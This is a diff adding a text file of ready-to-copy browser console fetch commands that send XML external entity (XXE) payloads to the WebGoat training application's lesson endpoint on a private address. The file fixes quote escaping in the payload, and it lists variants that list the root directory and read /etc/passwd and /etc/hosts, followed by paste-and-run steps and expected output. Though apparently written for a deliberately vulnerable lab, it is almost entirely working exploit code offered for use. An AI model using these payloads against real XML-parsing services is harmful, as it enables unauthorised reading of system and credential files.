@@ -1,0 +1,166 @@
+====================================================================
+XXE ATTACK - FIXED FETCH COMMANDS
+====================================================================
+
+PROBLEM: Quote escaping in the body parameter
+SOLUTION: Use single quotes for the outer string, double quotes inside
+
+====================================================================
+✅ CORRECTED FETCH COMMAND:
+====================================================================
+
+await fetch("http://192.168.254.112:8001/WebGoat/xxe/simple", {
+    "credentials": "include",
+    "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0",
+        "Accept": "*/*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Content-Type": "application/xml",
+        "X-Requested-With": "XMLHttpRequest",
+        "Priority": "u=0"
+    },
+    "referrer": "http://192.168.254.112:8001/WebGoat/start.mvc?username=nooniman",
+    "body": '<!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>',
+    "method": "POST",
+    "mode": "cors"
+}).then(r => r.text()).then(console.log);
+
+====================================================================
+ALTERNATIVE - Escape the quotes:
+====================================================================
+
+await fetch("http://192.168.254.112:8001/WebGoat/xxe/simple", {
+    "credentials": "include",
+    "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0",
+        "Accept": "*/*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Content-Type": "application/xml",
+        "X-Requested-With": "XMLHttpRequest",
+        "Priority": "u=0"
+    },
+    "referrer": "http://192.168.254.112:8001/WebGoat/start.mvc?username=nooniman",
+    "body": "<!DOCTYPE comment [<!ENTITY xxe SYSTEM \"file:///\">]><comment><text>&xxe;</text></comment>",
+    "method": "POST",
+    "mode": "cors"
+}).then(r => r.text()).then(console.log);
+
+====================================================================
+SIMPLEST VERSION - Copy This:
+====================================================================
+
+fetch("http://192.168.254.112:8001/WebGoat/xxe/simple", {
+  method: "POST",
+  credentials: "include",
+  headers: {
+    "Content-Type": "application/xml"
+  },
+  body: '<!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>'
+}).then(r => r.text()).then(console.log);
+
+====================================================================
+OTHER XXE PAYLOADS (Ready to Copy):
+====================================================================
+
+1. List Root Directory (Linux):
+--------------------------------
+fetch("http://192.168.254.112:8001/WebGoat/xxe/simple", {
+  method: "POST",
+  credentials: "include",
+  headers: {"Content-Type": "application/xml"},
+  body: '<!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>'
+}).then(r => r.text()).then(console.log);
+
+
+2. Read /etc/passwd:
+--------------------
+fetch("http://192.168.254.112:8001/WebGoat/xxe/simple", {
+  method: "POST",
+  credentials: "include",
+  headers: {"Content-Type": "application/xml"},
+  body: '<!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><comment><text>&xxe;</text></comment>'
+}).then(r => r.text()).then(console.log);
+
+
+3. Read /etc/hosts:
+-------------------
+fetch("http://192.168.254.112:8001/WebGoat/xxe/simple", {
+  method: "POST",
+  credentials: "include",
+  headers: {"Content-Type": "application/xml"},
+  body: '<!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><comment><text>&xxe;</text></comment>'
+}).then(r => r.text()).then(console.log);
+
+
+4. Full XML Format (if compact doesn't work):
+----------------------------------------------
+fetch("http://192.168.254.112:8001/WebGoat/xxe/simple", {
+  method: "POST",
+  credentials: "include",
+  headers: {"Content-Type": "application/xml"},
+  body: '<?xml version="1.0"?><!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>'
+}).then(r => r.text()).then(console.log);
+
+
+5. With Proper XML Structure:
+------------------------------
+fetch("http://192.168.254.112:8001/WebGoat/xxe/simple", {
+  method: "POST",
+  credentials: "include",
+  headers: {"Content-Type": "application/xml"},
+  body: `<?xml version="1.0"?>
+<!DOCTYPE comment [
+  <!ENTITY xxe SYSTEM "file:///">
+]>
+<comment>
+  <text>&xxe;</text>
+</comment>`
+}).then(r => r.text()).then(console.log);
+
+====================================================================
+STEP-BY-STEP:
+====================================================================
+
+1. Open WebGoat XXE lesson
+2. Open DevTools (F12) → Console tab
+3. Copy one of the commands above (simplest version recommended)
+4. Paste into Console
+5. Press Enter
+6. Check the output!
+
+====================================================================
+WHAT CHANGED:
+====================================================================
+
+BEFORE (❌ Broken):
+body: "<!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]>..."
+                                              ^^ These quotes break it
+
+AFTER (✅ Fixed):
+body: '<!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]>...'
+      ^ Single quotes outside, double quotes inside work fine
+
+OR:
+body: "<!DOCTYPE comment [<!ENTITY xxe SYSTEM \"file:///\">]>..."
+                                              ^^ Escaped quotes
+
+====================================================================
+EXPECTED RESPONSE:
+====================================================================
+
+If successful, you should see:
+- Directory listing (bin, boot, dev, etc, home, root, usr, var)
+- Or file contents if reading a specific file
+- Lesson marked as complete in WebGoat
+
+====================================================================
+IF IT STILL DOESN'T WORK:
+====================================================================
+
+1. Try different payloads (2-5 above)
+2. Check if endpoint is correct (/WebGoat/xxe/simple)
+3. Verify you're logged into WebGoat
+4. Try the PowerShell script: .\xxe_attack.ps1
+5. Use the HTML tool: xxe_attack_tool.html
+
+====================================================================
